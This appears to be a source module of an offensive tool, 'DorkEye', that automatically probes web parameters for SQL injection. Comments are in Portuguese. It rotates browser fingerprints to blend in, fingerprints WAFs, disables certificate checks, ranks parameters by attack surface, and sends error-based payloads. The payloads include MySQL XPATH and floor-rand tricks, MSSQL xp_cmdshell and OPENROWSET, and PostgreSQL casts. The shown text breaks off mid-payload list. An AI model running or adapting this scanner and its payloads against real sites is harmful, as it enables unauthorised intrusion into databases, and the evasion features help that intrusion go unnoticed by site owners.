"""
DorkEye SQLi Detector
═══════════════════════════════════════════════════════════════
SQL injection multi-método para o DorkEye Project

Contém:
  - SQLiConfidence         enum
  - HTTPFingerprint        dataclass
  - load_http_fingerprints / resolve_reference / resolve_accept_language
  - USER_AGENTS
  - HTTPFingerprintRotator
  - CircuitBreaker
  - _ScriptStripper / _strip_script_tags
  - WAF_SIGNATURES
  - _HIGH_PRIORITY_PARAMS / _MEDIUM_PRIORITY_PARAMS
  - SQLiDetector           (main class)

Author: xPloits3c I.C.W.T | https://github.com/xPloits3c/DorkEye
"""

import os
import re
import sys
import time
import json
import random
import difflib
import statistics
import threading
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, parse_qs, urlencode
from html.parser import HTMLParser as _HTMLParser

import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Flags de interrupção — espelhadas do signal handler do mappingexpo.py ────────────────
_exit_requested: bool = False
_skip_current:   bool = False


# ══════════════════════════════════════════════════════════════
#  Auto-detecção Termux / Android
# ══════════════════════════════════════════════════════════════

def _detect_termux() -> bool:
    """Retorna True quando executando dentro do Termux no Android."""
    return (
        "TERMUX_VERSION" in os.environ
        or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
        or os.path.isdir("/data/data/com.termux")
    )

TERMUX_IS_ANDROID: bool = _detect_termux()


# ══════════════════════════════════════════════════════════════
#  Sleep interrompível
# ══════════════════════════════════════════════════════════════

def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
    """Dorme em passos pequenos; retorna imediatamente se uma flag de interrupção estiver definida."""
    elapsed = 0.0
    while elapsed < seconds:
        if _exit_requested or _skip_current:
            return
        time.sleep(min(step, seconds - elapsed))
        elapsed += step


# ══════════════════════════════════════════════════════════════
#  SQLiConfidence
# ══════════════════════════════════════════════════════════════

class SQLiConfidence(Enum):
    """Níveis de confiança para findings de SQL injection."""
    NONE     = "none"
    LOW      = "low"
    MEDIUM   = "medium"
    HIGH     = "high"
    CRITICAL = "critical"


# ══════════════════════════════════════════════════════════════
#  Dataclass HTTPFingerprint
# ══════════════════════════════════════════════════════════════

@dataclass
class HTTPFingerprint:
    """Snapshot imutável de um fingerprint HTTP de navegador."""
    browser:         str
    os:              str
    user_agent:      str
    accept_language: str
    accept_encoding: str
    accept:          str
    referer:         str
    sec_fetch_dest:  str
    sec_fetch_mode:  str
    sec_fetch_site:  str
    cache_control:   str


# ══════════════════════════════════════════════════════════════
#  Auxiliares de HTTP Fingerprinting
# ══════════════════════════════════════════════════════════════

def load_http_fingerprints() -> Dict:
    """Carrega http_fingerprints.json; retorna um dict marcado com _mode."""
    fingerprint_file = Path(__file__).parent.parent / "http_fingerprints.json"
    try:
        with open(fingerprint_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or not data:
            raise ValueError("Arquivo de fingerprint vazio ou inválido")
        if "fingerprints" in data:
            return {
                "_mode":             "advanced",
                "_meta":             data.get("_meta", {}),
                "fingerprints":      data.get("fingerprints", {}),
                "language_profiles": data.get("language_profiles", {}),
                "common_headers":    data.get("common_headers", {})
            }
        return {"_mode": "legacy", "fingerprints": data}
    except Exception as e:
        print(f"[sqli] Aviso: falha ao carregar HTTP fingerprints: {e}", file=sys.stderr)
        print("[sqli] HTTP fingerprinting será desativado", file=sys.stderr)
        return {"_mode": "disabled"}


def resolve_reference(value: str, common_headers: Dict) -> str:
    """Resolve um token @reference para seu valor em common_headers."""
    if isinstance(value, str) and value.startswith("@"):
        key = value[1:]
        return common_headers.get(key, "")
    return value


def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
    """Escolhe um perfil de idioma aleatório e retorna a string Accept-Language correspondente."""
    profiles = fp_headers.get("accept_language_profiles")
    if not profiles:
        return ""
    profile = random.choice(profiles)
    return language_profiles.get(profile, "")


# ══════════════════════════════════════════════════════════════
#  Pool de User-Agents
# ══════════════════════════════════════════════════════════════

USER_AGENTS: Dict[str, List[str]] = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 "
        "(KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    ],
    "edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    ],
}


# ══════════════════════════════════════════════════════════════
#  HTTPFingerprintRotator
# ══════════════════════════════════════════════════════════════

class HTTPFingerprintRotator:
    """Rotaciona perfis de fingerprint de navegador a cada request."""

    def __init__(self):
        self.raw_fingerprints    = load_http_fingerprints()
        self.fingerprints        = self._build_fingerprints()
        self.current_index       = 0
        self.current_fingerprint = None

    def _build_fingerprints(self) -> List[HTTPFingerprint]:
        fingerprints: List[HTTPFingerprint] = []
        mode = self.raw_fingerprints.get("_mode")

        if mode == "legacy":
            for fp_data in self.raw_fingerprints.get("fingerprints", {}).values():
                try:
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp_data["browser"],
                        os              = fp_data["os"],
                        user_agent      = fp_data["user_agent"],
                        accept_language = fp_data["accept_language"],
                        accept_encoding = fp_data["accept_encoding"],
                        accept          = fp_data["accept"],
                        referer         = "",
                        sec_fetch_dest  = fp_data["sec_fetch_dest"],
                        sec_fetch_mode  = fp_data["sec_fetch_mode"],
                        sec_fetch_site  = fp_data["sec_fetch_site"],
                        cache_control   = fp_data["cache_control"],
                    ))
                except KeyError:
                    continue
            return fingerprints

        if mode == "advanced":
            language_profiles = self.raw_fingerprints.get("language_profiles", {})
            common_headers    = self.raw_fingerprints.get("common_headers", {})
            fps               = self.raw_fingerprints.get("fingerprints", {})
            for fp in fps.values():
                try:
                    headers   = fp.get("headers", {})
                    sec_fetch = headers.get("sec_fetch", {})
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp.get("browser", ""),
                        os              = fp.get("os", ""),
                        user_agent      = fp.get("user_agent", ""),
                        accept_language = resolve_accept_language(headers, language_profiles),
                        accept_encoding = resolve_reference(headers.get("accept_encoding", ""), common_headers),
                        accept          = resolve_reference(headers.get("accept", ""), common_headers),
                        referer         = "",
                        sec_fetch_dest  = sec_fetch.get("dest", "document"),
                        sec_fetch_mode  = sec_fetch.get("mode", "navigate"),
                        sec_fetch_site  = sec_fetch.get("site", "none"),
                        cache_control   = resolve_reference(headers.get("cache_control", ""), common_headers),
                    ))
                except Exception:
                    continue

        return fingerprints

    def get_random(self) -> Optional[HTTPFingerprint]:
        self.current_fingerprint = random.choice(self.fingerprints) if self.fingerprints else None
        return self.current_fingerprint

    def get_next(self) -> Optional[HTTPFingerprint]:
        if not self.fingerprints:
            return None
        self.current_fingerprint = self.fingerprints[self.current_index]
        self.current_index       = (self.current_index + 1) % len(self.fingerprints)
        return self.current_fingerprint

    def build_headers(self, referer: str = "") -> Dict[str, str]:
        if not self.current_fingerprint:
            return {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
        headers = {
            "User-Agent":                self.current_fingerprint.user_agent,
            "Accept":                    self.current_fingerprint.accept,
            "Accept-Language":           self.current_fingerprint.accept_language,
            "Accept-Encoding":           self.current_fingerprint.accept_encoding,
            "Sec-Fetch-Dest":            self.current_fingerprint.sec_fetch_dest,
            "Sec-Fetch-Mode":            self.current_fingerprint.sec_fetch_mode,
            "Sec-Fetch-Site":            self.current_fingerprint.sec_fetch_site,
            "Cache-Control":             self.current_fingerprint.cache_control,
            "Pragma":                    "no-cache",
            "DNT":                       "1",
            "Connection":                "keep-alive",
            "Upgrade-Insecure-Requests": "1",
        }
        if referer:
            headers["Referer"] = referer
        return headers


# ══════════════════════════════════════════════════════════════
#  CircuitBreaker
# ══════════════════════════════════════════════════════════════

class CircuitBreaker:
    """Rastreia hosts inalcançáveis e curto-circuita requests futuros."""

    def __init__(self):
        self._dead: Set[str] = set()

    def _key(self, url: str) -> str:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def is_dead(self, url: str) -> bool:
        return self._key(url) in self._dead

    def mark_dead(self, url: str) -> None:
        self._dead.add(self._key(url))

    def reset(self) -> None:
        self._dead.clear()


# ══════════════════════════════════════════════════════════════
#  Removedor de tags script baseado em HTMLParser
# ══════════════════════════════════════════════════════════════

class _ScriptStripper(_HTMLParser):
    """Subclasse de HTMLParser que remove todo bloco <script>…</script>."""

    def __init__(self):
        super().__init__(convert_charrefs=False)
        self._in_script: int = 0
        self._parts: list   = []

    def handle_starttag(self, tag, attrs):
        if tag.lower() == "script":
            self._in_script += 1

    def handle_endtag(self, tag):
        if tag.lower() == "script" and self._in_script:
            self._in_script -= 1

    def handle_data(self, data):
        if not self._in_script:
            self._parts.append(data)

    def handle_entityref(self, name):
        if not self._in_script:
            self._parts.append(f"&{name};")

    def handle_charref(self, name):
        if not self._in_script:
            self._parts.append(f"&#{name};")

    def get_result(self) -> str:
        return "".join(self._parts)


_SCRIPT_TAG_RE_FALLBACK = re.compile(
    r"<script(?:[^>]*)>[\s\S]*?</script\s*>", re.IGNORECASE
)


def _strip_script_tags(body: str) -> str:
    """Retorna o corpo com todos os blocos <script> removidos."""
    stripper = _ScriptStripper()
    try:
        stripper.feed(body)
        stripper.close()
        return stripper.get_result()
    except Exception:
        return _SCRIPT_TAG_RE_FALLBACK.sub("", body)


# ══════════════════════════════════════════════════════════════
#  Assinaturas de detecção de WAF
# ══════════════════════════════════════════════════════════════

WAF_SIGNATURES: Dict[str, List[str]] = {
    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare", "attention required! | cloudflare"],
    "modsecurity": ["mod_security", "modsecurity", "406 not acceptable", "not acceptable!"],
    "wordfence":   ["wordfence", "generated by wordfence"],
    "sucuri":      ["x-sucuri-id", "sucuri website firewall", "access denied - sucuri"],
    "imperva":     ["x-iinfo", "incapsula incident", "_incap_ses_"],
    "akamai":      ["akamai", "x-akamai-transformed", "reference #18"],
    "f5_bigip":    ["x-waf-event-info", "bigipserver", "the requested url was rejected"],
    "barracuda":   ["barra_counter_session", "barracuda"],
    "fortiweb":    ["fortigate", "fortiweb"],
    "aws_waf":     ["x-amzn-requestid", "awselb", "forbidden - aws waf"],
    "denyall":     ["denyall", "x-denyall"],
    "reblaze":     ["x-reblaze-protection"],
}


# ══════════════════════════════════════════════════════════════
#  Tabelas de prioridade de parâmetros
# ══════════════════════════════════════════════════════════════

_HIGH_PRIORITY_PARAMS: frozenset = frozenset({
    "id", "pid", "uid", "nid", "tid", "cid", "rid", "eid", "fid", "gid",
    "page", "pg", "p", "num", "item", "product", "prod", "article",
    "cat", "category", "sort", "order", "by", "type", "idx", "index",
    "ref", "record", "row", "entry", "post", "news", "view",
})

_MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
    "search", "q", "query", "s", "keyword", "kw", "term", "find",
    "name", "user", "username", "login", "email", "mail",
    "city", "country", "region", "lang", "language",
    "filter", "tag", "label", "topic", "subject", "section",
})


# ══════════════════════════════════════════════════════════════
#  SQLiDetector — constantes de timing (Termux-aware)
# ══════════════════════════════════════════════════════════════

_CONNECT_TIMEOUT  = 3 if TERMUX_IS_ANDROID else 4
_DEFAULT_READ     = 6 if TERMUX_IS_ANDROID else 8
_TIMEBASED_MARGIN = 2.5
_SLEEP_DELAY      = 3
_BASELINE_SAMPLES = 1 if TERMUX_IS_ANDROID else 2
_MAX_BASELINE_S   = 6.0

_PROBE_SAMPLES       = 2 if TERMUX_IS_ANDROID else 3
_PROBE_NOISE_BUFFER  = 0.04
_PROBE_MAX_THRESHOLD = 0.18
_PROBE_SAMPLE_BYTES  = 8_192   # [NEW-7] limite para comparação difflib
_BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3
_TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2
_UNION_COLUMNS_MAX   = 6       # aumentado de 5 — maioria dos apps reais usa ≤6 colunas

# ── [FP-1] Limiar de estabilidade da página ──────────────────────────────────────────
# Similaridade mínima entre duas requests limpas para considerar a página estável
# o bastante para teste boolean-blind. Abaixo disso → boolean blind é pulado.
_PAGE_STABILITY_MIN  = 0.82

# ── [FP-7] Limiar fast-path do probe ─────────────────────────────────────────
# Aumentado de 50 → 150 bytes: pequenos deltas (timestamps, nonces, contadores
# de anúncios) disparavam execuções desnecessárias da suíte completa em cada parâmetro dinâmico.
_FP_FAST_PATH_BYTES  = 150


# ══════════════════════════════════════════════════════════════
#  SQLiDetector
# ══════════════════════════════════════════════════════════════

class SQLiDetector:
    """
    Detector de SQL injection multi-método que testa parâmetros GET/POST/JSON/path.

    Métodos de detecção (executados em ordem por parâmetro):
      1. error_based      — injeta payloads que disparam assinaturas de erro do DB
      2. union_based      — investiga a contagem de colunas (NULL + colunas string)
      3. boolean_blind    — dual-metric: diferença de tamanho + razão de similaridade
      4. time_based_blind — payloads SLEEP/pg_sleep/WAITFOR específicos por DB
      5. stacked_query    — probe leve de stacked-query (novo)

    Os parâmetros são priorizados por superfície de ataque antes do teste.
    Um CircuitBreaker pula requests futuros para hosts que ficaram inalcançáveis.
    """

    # ── [NEW-2] Extended SQL error signatures ─────────────────────────────────
    SQL_ERROR_SIGNATURES = {
        "mysql": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"mysql_num_rows\(\)",
            r"mysql_fetch_(?:array|assoc|row|object)",
            r"MySQL server version for the right syntax",
            r"com\.mysql\.jdbc\.exceptions",
            # [NEW-2] padrões adicionais de MySQL
            r"Table '.*' doesn't exist",
            r"Unknown column '.*' in 'field list'",
            r"FUNCTION .* does not exist",
            r"Subquery returns more than 1 row",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\bpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR:\s+unterminated quoted string",
            # [NEW-2] padrões adicionais de PostgreSQL
            r"PG::SyntaxError",
            r"pg_query\(\):",
            r"ERROR:\s+invalid input syntax for",
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"\[Microsoft\]\[ODBC SQL Server Driver\]",
            r"Incorrect syntax near",
            # [NEW-2] padrões adicionais de MSSQL
            r"SqlException",
            r"System\.Data\.SqlClient",
            r"Procedure or function .* expects parameter",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"sqlite3\.OperationalError:",
            r"near \".*\": syntax error",
            # [NEW-2] padrões adicionais de SQLite
            r"unrecognized token:",
            r"incomplete input",
        ],
        "oracle": [
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\boci_",
            r"ORA-\d{5}",
            r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
            # [NEW-2] padrões adicionais de Oracle
            r"PLS-\d{5}",
            r"TNS:\s+",
        ],
        # [NEW-2] Bucket genérico — captura frameworks de DB diversos
        "generic": [
            r"syntax error.*near",
            r"unexpected end of SQL command",
            r"unterminated string literal",
            r"SQL command not properly ended",
            r"invalid use of null",
            r"data type mismatch",
        ],
    }

    _UNION_COL_MISMATCH_RE = re.compile(
        r"(The used SELECT statements have a different number of columns"
        r"|each UNION query must have the same number of columns"
        r"|SELECTs to the left and right of UNION do not have the same number"
        r"|ORA-01789"
        r"|column count doesn.t match)",
        re.IGNORECASE,
    )

    def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ):
        """Inicializa com flag stealth, timeout, rotator de fingerprint, circuit breaker."""
        self.stealth             = stealth
        self.read_timeout        = timeout
        self.circuit_breaker     = CircuitBreaker()
        self.fingerprint_rotator = HTTPFingerprintRotator()
        self._session            = self._build_session()
        self._status_cb          = None

    def _cb(self, msg: str) -> None:
        """Envia uma mensagem de fase/status ao callback registrado."""
        if callable(self._status_cb):
            try:
                self._status_cb(msg)
            except Exception:
                pass

    def _build_session(self) -> requests.Session:
        session = requests.Session()
        retry   = Retry(
            total            = 2,
            backoff_factor   = 0.5,
            status_forcelist = [429, 500, 502, 503, 504],
            allowed_methods  = ["GET", "POST"],
            raise_on_status  = False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://",  adapter)
        session.mount("https://", adapter)
        return session

    def _timeout(self, extra_read: float = 0) -> Tuple[int, float]:
        return (_CONNECT_TIMEOUT, self.read_timeout + extra_read)

    def _run_interruptible(self, fn, total_timeout: float, on_connect_error=None):
        """Executa fn() em uma thread daemon; retorna o resultado ou None em timeout/interrupção."""
        _POLL         = 0.1
        result_holder = [None]
        exc_holder    = [None]
        done_event    = threading.Event()

        def _worker():
            try:
                result_holder[0] = fn()
            except (requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError) as e:
                exc_holder[0] = e
            except Exception:
                pass
            finally:
                done_event.set()

        threading.Thread(target=_worker, daemon=True).start()

        deadline = total_timeout + 1.0
        elapsed  = 0.0
        while elapsed < deadline:
            if _exit_requested or _skip_current:
                return None
            if done_event.wait(timeout=_POLL):
                if exc_holder[0] is not None and on_connect_error:
                    on_connect_error()
                return result_holder[0]
            elapsed += _POLL

        return None

    def _get(self, url: str, extra_read: float = 0) -> Optional[requests.Response]:
        """Realiza uma request GET com fingerprint rotacionado; retorna Response ou None."""
        if self.circuit_breaker.is_dead(url):
            return None

        self.fingerprint_rotator.get_random()
        headers = self.fingerprint_rotator.build_headers()
        timeout = self._timeout(extra_read)

        def _do():
            return self._session.get(
                url,
                headers         = headers,
                timeout         = timeout,
                verify          = False,
                allow_redirects = True,
            )

        total = _CONNECT_TIMEOUT + self.read_timeout + extra_read
        return self._run_interruptible(
            _do,
            total_timeout    = total,
            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
        )

    def _post(
        self,
        url:     str,
        data:    Optional[Dict] = None,
        json_body: Optional[Dict] = None,
    ) -> Optional[requests.Response]:
        """Realiza uma request POST (form ou JSON) com fingerprint rotacionado; retorna Response ou None."""
        if self.circuit_breaker.is_dead(url):
            return None

        self.fingerprint_rotator.get_random()
        headers = self.fingerprint_rotator.build_headers()
        timeout = self._timeout()

        if json_body is not None:
            def _do():
                return self._session.post(
                    url, json=json_body, headers=headers,
                    timeout=timeout, verify=False,
                )
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            def _do():
                return self._session.post(
                    url, data=data or {}, headers=headers,
                    timeout=timeout, verify=False,
                )

        total = _CONNECT_TIMEOUT + self.read_timeout
        return self._run_interruptible(
            _do,
            total_timeout    = total,
            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
        )

    # ──────────────────────────────────────────────────────────
    #  Detecção de WAF
    # ──────────────────────────────────────────────────────────

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        """Escaneia headers e corpo da resposta por assinaturas de WAF; retorna o nome ou None."""
        headers_keys   = {k.lower() for k in response.headers}
        headers_values = " ".join(v.lower() for v in response.headers.values())
        body_snippet   = response.text[:2000].lower()

        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in headers_keys or sig in headers_values or sig in body_snippet:
                    return waf_name

        if response.status_code in (403, 406, 419, 429) and len(response.text) < 600:
            return "generic_waf"

        return None

    def _measure_baseline_latency(self, url: str) -> Optional[float]:
        """Mede a latência média de resposta em _BASELINE_SAMPLES amostras; retorna ou None."""
        times = []
        for _ in range(_BASELINE_SAMPLES):
            if self.circuit_breaker.is_dead(url):
                return None
            if _exit_requested or _skip_current:
                return None
            t0       = time.monotonic()
            response = self._get(url)
            elapsed  = time.monotonic() - t0
            if response is None:
                return None
            times.append(elapsed)
            _interruptible_sleep(0.3)
        baseline = sum(times) / len(times)
        if baseline > _MAX_BASELINE_S:
            return None
        return baseline

    def has_query_params(self, url: str) -> bool:
        """Retorna True se a URL contém ao menos um parâmetro de consulta GET."""
        try:
            return bool(parse_qs(urlparse(url).query))
        except Exception:
            return False

    def _extract_query_params(self, url: str) -> Dict[str, str]:
        """Interpreta e retorna todos os parâmetros GET como um dict plano {nome: primeiro_valor}."""
        try:
            params = parse_qs(urlparse(url).query)
            return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        except Exception:
            return {}

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Retorna a URL com param_name substituído pelo payload. Preserva o fragmento."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if param_name not in params:
            return url
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        rebuilt = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        if parsed.fragment:
            rebuilt += f"#{parsed.fragment}"
        return rebuilt

    def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
        """Busca o baseline; retorna (status_code, corpo_texto, corpo_len) ou None."""
        response = self._get(url)
        if response is None:
            return None
        return (response.status_code, response.text, len(response.text))

    def _match_sql_errors(self, body: str) -> Optional[Tuple[str, str]]:
        """Remove tags script e escaneia por assinaturas de erro SQL; retorna (db, padrão) ou None."""
        clean_body = _strip_script_tags(body)
        for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, clean_body, re.IGNORECASE):
                    return (db_type, pattern)
        return None

    # ──────────────────────────────────────────────────────────
    #  Priorização de parâmetros
    # ──────────────────────────────────────────────────────────

    def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
        """Ordena params em prioridade alta/média/baixa; retorna lista concatenada."""
        high:   List[str] = []
        medium: List[str] = []
        low:    List[str] = []

        for param, value in params.items():
            p_lower = param.lower()
            if value.isdigit() or p_lower in _HIGH_PRIORITY_PARAMS:
                high.append(param)
            elif p_lower in _MEDIUM_PRIORITY_PARAMS:
                medium.append(param)
            else:
                low.append(param)

        return high + medium + low

    # ──────────────────────────────────────────────────────────
    #  [NEW-7] Probe de parâmetro — fast-path + limite de 8 KB
    # ──────────────────────────────────────────────────────────

    def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
        """
        Retorna True se o parâmetro mostra variação significativa quando injetado com uma aspa.

        [NEW-7] Duas melhorias de desempenho vs v4.9.0:
          - Fast-path: se algum corpo de resposta difere do baseline em >50 bytes,
            declara variação imediatamente sem rodar difflib.
          - comparação difflib limitada aos primeiros _PROBE_SAMPLE_BYTES (8 KB) de cada
            corpo — mesma abordagem usada em xss.py; evita O(n²) em páginas grandes.
        """
        if self.circuit_breaker.is_dead(url):
            return False

        r_init = self._get(url)
        if r_init is None:
            return False

        baseline_status: int       = r_init.status_code

        # [FP-7] Limiar fast-path aumentado para _FP_FAST_PATH_BYTES (150 B).
        # O limiar antigo de 50 bytes era atingido facilmente demais por timestamps, nonces
        # e valores de contadores embutidos no corpo da página.
        if abs(len(baseline_content) - len(r_init.text)) > _FP_FAST_PATH_BYTES:
            # Ainda constrói o baseline de ruído — apenas marca esta amostra como ruidosa
            noise_samples: List[float] = [0.05]
        else:
            b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
            b2  = r_init.text[: _PROBE_SAMPLE_BYTES]
            first_sim                  = difflib.SequenceMatcher(None, b1, b2).ratio()
            noise_samples: List[float] = [1.0 - first_sim]

        for _ in range(_PROBE_SAMPLES - 1):
            if _exit_requested or _skip_current:
                return False
            r = self._get(url)
            if r is None:
                return False
            if abs(len(baseline_content) - len(r.text)) > _FP_FAST_PATH_BYTES:
                noise_samples.append(0.05)
            else:
                b1  = baseline_content[: _PROBE_SAMPLE_BYTES]
                b2  = r.text[: _PROBE_SAMPLE_BYTES]
                sim = difflib.SequenceMatcher(None, b1, b2).ratio()
                noise_samples.append(1.0 - sim)
            _interruptible_sleep(0.2)

        noise_level = statistics.median(noise_samples)

        if noise_level > _PROBE_MAX_THRESHOLD:
            return False

        adaptive_threshold = noise_level + _PROBE_NOISE_BUFFER

        if _exit_requested or _skip_current:
            return False

        test_url  = self._inject_payload(url, param_name, "1'")
        r_payload = self._get(test_url)
        if r_payload is None:
            return False

        if r_payload.status_code != baseline_status:
            return False

        if abs(len(baseline_content) - len(r_payload.text)) > _FP_FAST_PATH_BYTES:
            return True

        b1           = baseline_content[: _PROBE_SAMPLE_BYTES]
        b2           = r_payload.text[: _PROBE_SAMPLE_BYTES]
        payload_noise = 1.0 - difflib.SequenceMatcher(None, b1, b2).ratio()

        return payload_noise > adaptive_threshold

    # ──────────────────────────────────────────────────────────
    #  [FP-1] Pre-check de estabilidade da página
    # ──────────────────────────────────────────────────────────

    def _check_page_stability(self, url: str) -> float:
        """
        Busca a url duas vezes sem injeção e mede a similaridade do conteúdo.
        Retorna uma razão em [0.0, 1.0]:  1.0 = idêntico, 0.0 = completamente
        diferente.

        [FP-1] Inspirado no checkStability() do sqlmap: páginas dinâmicas (anúncios,
        conteúdo rotativo, timestamps) produzem variação natural constante que é
        indistinguível de sinais de SQLi boolean-blind. Se a estabilidade cair
        abaixo de _PAGE_STABILITY_MIN, o chamador deve pular o boolean blind.
        """
        r1 = self._get(url)
        if r1 is None:
            return 0.0
        _interruptible_sleep(0.4)
        r2 = self._get(url)
        if r2 is None:
            return 0.0
        b1 = r1.text[:_PROBE_SAMPLE_BYTES]
        b2 = r2.text[:_PROBE_SAMPLE_BYTES]
        return difflib.SequenceMatcher(None, b1, b2).ratio()

    # ──────────────────────────────────────────────────────────
    #  [FP-2] Guard de erros SQL no baseline
    # ──────────────────────────────────────────────────────────

    def _baseline_has_sql_errors(self, url: str) -> bool:
        """
        Retorna True se a URL LIMPA já contém assinaturas de erro SQL.

        [FP-2] Apps em modo debug, queries quebradas no backend ou ORMs
        verbosos podem emitir texto de erro SQL em toda request. Rodar a suíte
        error-based contra tais alvos sempre casará, produzindo 100% de falsos
        positivos. Este guard detecta essa condição antes de qualquer
        payload de injeção ser enviado.
        """
        r = self._get(url)
        if r is None:
            return False
        return self._match_sql_errors(r.text) is not None

    # ──────────────────────────────────────────────────────────
    #  [1] Error-based — [NEW-1] conjunto de payloads expandido
    # ──────────────────────────────────────────────────────────

    def _test_error_based(self, url: str, param_name: str) -> Dict:
        """
        Injeta payloads error-based e procura assinaturas de erro do DB.

        [NEW-1] Expandido de 3 para 22 payloads cobrindo os 5 engines de DB
        mais 4 variantes de comentário WAF-bypass.
        """
        result = {
            "method":     "error_based",
            "vulnerable": False,
            "confidence": SQLiConfidence.NONE.value,
            "evidence":   [],
            "waf":        None,
        }

        # ── [FP-2] Guard de erros SQL no baseline ──────────────────────────────
        # Se a página limpa já exibe erros SQL, todo payload casará
        # → falsos positivos garantidos. Pula inteiramente.
        if self._baseline_has_sql_errors(url):
            result["evidence"].append(
                "[FP-guard] Assinaturas de erro SQL encontradas no baseline limpo — "
                "teste error-based pulado para evitar falsos positivos"
            )
            return result

        # ── [NEW-1] Full payload set ──────────────────────────────────────────
        payloads = [
            # ── MySQL / MariaDB ───────────────────────────────────────────────
            # extractvalue — dispara erro XPATH com conteúdo do payload
            "1' AND extractvalue(0,concat(0x7e,'TEST',0x7e)) AND '1'='1",
            "1 AND extractvalue(0,concat(0x7e,'TEST',0x7e))",
            # updatexml — vetor alternativo de erro XPATH
            "1' AND updatexml(0,concat(0x7e,'TEST'),0) AND '1'='1",
            # floor/rand GROUP BY — error-based clássico do MySQL
            (
                "1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,'TEST',"
                "0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
            ),
            # Query dupla via subselect
            "1 AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x"
            " FROM information_schema.tables GROUP BY x)a)",

            # ── Microsoft SQL Server ──────────────────────────────────────────
            # CAST para int causa erro de conversão de tipo
            "1 AND 1=CAST(CONCAT(0x7e,'TEST',0x7e) AS INT)",
            "1' AND 1=CONVERT(int,(SELECT TOP 1 'TEST'))--",
            # xp_cmdshell — dispara erro de permissão/feature que vaza contexto do DB
            "1'; EXEC xp_cmdshell('TEST')--",
            # Erro OPENROWSET
            "1'; SELECT * FROM OPENROWSET('SQLOLEDB','TEST','')--",

            # ── PostgreSQL ────────────────────────────────────────────────────
            "1 AND 1=CAST('TEST' AS INT)",
            "1' AND 1=CAST(version() AS INT)--",
            # pg_sleep(0) — dispara erro de função em alvos não-PG
            "1; SELECT pg_sleep(0)--",

            # ── Oracle ────────────────────────────────────────────────────────
